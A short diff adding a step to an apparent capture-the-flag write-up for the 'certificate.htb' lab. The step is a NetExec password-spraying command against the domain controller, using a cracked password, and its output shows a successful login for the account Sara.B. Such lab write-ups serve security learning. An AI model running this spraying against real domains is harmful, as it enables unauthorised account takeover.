@@ -352,5 +352,10 @@ One of them cracked!
 Ill use the users from earlier and try to spray this on the domain accounts
 
 ```python
+❯❯❯ nxc smb dc01.certificate.htb -u users.txt -p 'Blink182' --continue-on-success
 
+SMB         10.129.245.51   445    DC01             [+] certificate.htb\Sara.B:Blink182
 ```
+
+This user is now compromised!
+
